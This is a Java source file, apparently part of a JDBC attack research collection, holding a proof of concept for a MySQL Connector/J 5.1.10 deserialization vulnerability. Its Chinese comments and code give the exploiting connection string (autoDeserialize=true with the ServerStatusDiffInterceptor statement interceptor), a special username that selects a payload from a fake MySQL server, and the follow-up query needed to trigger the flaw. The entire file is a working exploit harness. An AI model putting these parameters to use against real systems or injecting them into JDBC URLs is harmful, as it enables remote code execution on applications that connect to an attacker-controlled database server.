package org.su18.jdbc.attack.mysql.serverstatus;

import org.su18.jdbc.attack.mysql.util.ConnectionUtil;

import java.sql.Connection;
import java.sql.PreparedStatement;

/**
 * 使用 https://github.com/4ra1n/mysql-fake-server 进行测试
 * 依赖版本 5.1.10
 * 驱动名称 com.mysql.jdbc.Driver
 * 属性名 statementInterceptors
 * 连接参数 autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor
 * 备注 <= 5.1.10 版本建立连接后需要执行查询才能触发漏洞
 *
 * @author Jasper
 */
public class Attack5110 {


	public static void main(String[] args) throws Exception {

		String driverName    = "com.mysql.jdbc.Driver";
		String connectionUrl = "jdbc:mysql://127.0.0.1:49435/whatever?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor";

		// 建立连接
		Connection connection = ConnectionUtil.getJDBCConnection(driverName, connectionUrl, "deser_CUSTOM", "");

		// 建立连接后需要继续查询才能触发漏洞
		PreparedStatement statement = connection.prepareStatement("select 1");
		statement.execute();

		statement.close();
		connection.close();
	}


}
